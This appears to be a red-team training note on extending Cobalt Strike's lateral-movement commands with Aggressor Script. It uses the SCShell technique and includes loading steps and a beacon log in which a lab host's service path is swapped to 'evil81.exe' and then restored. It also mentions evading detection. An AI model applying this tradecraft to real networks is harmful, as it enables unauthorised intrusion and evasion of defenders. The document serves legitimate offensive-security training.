
Both the `jump` and `remote-exec` commands can be extended via Aggressor Script to add custom techniques.  These can leverage any post-ex capability in Beacon, including PowerShell scripts, .NET assemblies, BOFs, and reflective DLLs.

### SCShell

One example is Charles Hamilton's [SCShell](https://github.com/Mr-Un1k0d3r/SCShell/tree/master/CS-BOF) project.  This implements a variation of PsExec, where an existing service is temporarily modified to run a payload and then restored afterwards, instead of a new service being created.

The project includes a CNA (Aggressor Script) file, which registers the technique via the [beacon_remote_exploit_register](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exploit_register) function.  Simply load `C:\Tools\SCShell\CS-BOF\scshell.cna` into the client by going to **Cobalt Strike > Script Manager**.  Then new `scshell`/`scshell64` exploits will be available.

![[Pasted image 20250714103338.png]]

```powershell
beacon> jump scshell64 lon-ws-1 smb
[*] Tasked beacon to jump to lon-ws-1 (windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337)) via SCShell

Trying to connect to lon-ws-1
SC_HANDLE Manager 0x000001EE3EBD50F0
Opening defragsvc
SC_HANDLE Service 0x000001EE3EBD5120
LPQUERY_SERVICE_CONFIGA need 0x00000142 bytes
Original service binary path "C:\Windows\system32\svchost.exe -k defragsvc"
Service path was changed to "C:\Windows\System32\evil81.exe"
Service was started
Service path was restored to "C:\Windows\system32\svchost.exe -k defragsvc"

[+] established link to child beacon: 10.10.120.10
```

> Custom techniques are useful when needing to simulate specific TTPs that are not included in Cobalt Strike by default, or to push back where the default techniques are detected.